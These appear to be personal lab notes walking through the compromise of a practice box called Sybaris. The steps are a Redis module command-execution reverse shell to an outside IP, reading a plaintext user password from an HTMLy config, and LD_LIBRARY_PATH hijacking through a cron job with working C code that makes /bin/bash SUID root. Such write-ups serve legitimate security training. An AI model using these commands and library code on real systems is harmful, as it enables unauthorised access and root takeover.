#box

*Created: 1/1/2026*

### Step 1

**Tags:** #Redis

🔗 **URL/Link:** https://github.com/n0b0dyCN/RedisModules-ExecuteCommand

**Command:**
```bash
system.exec "/bin/bash -i >& /dev/tcp/192.168.45.245/6379 0>&1"
```

*Port: 6379 | Asciinema Cast: [Step 1](attachments/Sybaris-1.cast)*

> 
> The command below is being ran inside Redis. To achieve this command execution we first need to inject a malicious module through RedisCommand-ExecuteModule

---

### Step 2

**Tags:** #Credential-Hunting #Credentials

**Command:**
```bash
cat /var/www/html/config/users/pablo.ini
```

*Asciinema Cast: [Step 2](attachments/Sybaris-2.cast)*

> 
> On the target machine we discover the presence of pablo's password inside the configuration of HTMLy that grants us SSH access

---

### Step 3

**Tags:** #LD_PRELOAD #Linux #Shared_Libraries

🔗 **URL/Link:** https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=LD_LIBRARY_PATH#ld_preload--ld_library_path

**Command:**
```c
// malicious.c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("chmod u+s /bin/bash");
    // system("echo 'root::0:0:root:/root:/usr/bin/zsh' > /etc/passwd");
}

// Compiled module
gcc -fPIC -shared -o utils.so utils.c -nostartfiles

// Move to target folder
mv utils.so /usr/local/lib/dev/
```

> 
> On /etc/crontab it's possible to read the variable LD_LIBRARY_PATH. This variable permits to override the declare binary location. We discover that one in particular is world-writable /usr/local/lib/dev
> 
> By doing `cat /etc/crontab` we realize a script called `/usr/bin/log-sweeper` is being executed.
> By executing it we get the following output:
> 
> `/usr/bin/log-sweeper: error while loading shared libraries: utils.so: cannot open shared object file: No such file or directory`
> 
> 
> Inside the crontab file we also realize that the LD_LIBRARY path has various paths.
> Specifically linpeas.sh helps us realize that one in particular is world writable: /usr/local/lib/dev
> 
> Due to the nature of the PATH locations, from left to right, the system will search that `utils.so` file respectively in:
> 
> * /usr/lib
> * /usr/lib64
> * /usr/local/lib/dev - WRITABLE ONE
> * /usr/local/lib/utils
> 
> Thus, considering that as of now the system is unable to find that library at all, putting a malicious library inside `utils.so` shall grant us code execution as root.
> 
> There are various ways to achieve root:
> 
> * Modify the `/bin/bash` file to have SUID and achieve LPE with GTFOBins: https://gtfobins.github.io/gtfobins/sudo/
> * Modify `/etc/passwd` and remove the password from root
> 
> Malicious C Code:
> 
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("chmod u+s /bin/bash");
    // system("echo 'root::0:0:root:/root:/usr/bin/zsh' > /etc/passwd");
}
```
> 
> Then compile it:
> 
> `gcc -fPIC -shared -o utils.so utils.c -nostartfiles`
> 
> Finally, move it to the writable directory:
> 
> `mv utils.so /usr/local/lib/dev/`

---

